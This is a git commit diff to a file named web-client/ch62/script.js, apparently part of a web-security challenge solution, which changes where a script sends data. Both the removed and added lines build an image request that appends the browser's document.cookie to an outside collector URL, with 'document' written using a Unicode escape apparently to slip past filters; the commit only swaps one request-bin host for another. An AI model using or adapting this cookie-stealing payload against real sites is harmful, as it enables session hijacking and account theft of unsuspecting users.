39d8bf0ac9b164a241cf76659fa4d5765538fcbf
aloisdasilva <80316925+aloisdasilva@users.noreply.github.com>
2024-07-02 23:33:42 +0200

    Update script.js

--- web-client/ch62/script.js
+++ web-client/ch62/script.js
@@ -1,2 +1,2 @@
 const img = new Image();
-img.src = 'https://coolendpoint.free.beeceptor.com/?cookie=' + doc\u0075ment.cookie;
+img.src = 'https://eoposx8condin77.m.pipedream.net/?cookie=' + doc\u0075ment.cookie;
